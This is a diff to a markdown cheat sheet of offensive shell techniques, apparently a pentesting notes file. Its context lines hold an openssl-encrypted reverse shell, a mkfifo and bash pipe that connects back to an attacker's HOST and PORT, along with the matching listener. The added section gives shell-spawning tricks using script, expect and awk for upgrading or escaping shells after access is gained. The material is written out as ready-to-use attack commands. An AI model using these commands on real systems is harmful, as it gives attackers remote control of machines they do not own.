@@ -44,3 +44,24 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
 mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <HOST>:<PORT> > /tmp/s; rm /tmp/s
 ```
 Source : [https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c](https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c)
+
+### Spawn("/bin/bash") if no python installed
+
+No python installed for the 'pty.spawn("/bin/bash")' trick? Can use expect or script as well :D
+
+#### Script
+```bash
+SHELL=/bin/bash script -q /dev/null
+```
+
+#### expect
+```bash
+expect -c 'spawn bash; interact'
+```
+Source : [https://twitter.com/ropnop/status/884928178048860160](https://twitter.com/ropnop/status/884928178048860160)
+
+
+### awk
+```bash
+awk 'BEGIN {system("/bin/bash")}'
+```
